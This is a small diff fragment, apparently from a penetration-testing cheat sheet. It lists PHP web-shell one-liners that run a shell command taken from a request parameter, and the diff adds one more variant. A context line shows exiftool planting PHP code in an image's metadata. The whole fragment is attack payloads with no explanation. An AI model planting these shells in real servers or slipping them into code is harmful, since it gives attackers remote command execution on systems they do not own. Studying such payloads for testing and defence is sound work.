@@ -10,3 +10,8 @@ exiftool -DocumentName="<h1>F1uffyGoat<br><?php if(isset(\$_REQUEST['cmd'])){ech
 or 
 
 <?php $cmd = $_GET['cmd']; echo system ($cmd);?>
+
+or
+
+<?php system($_GET['cmd']); ?>
+
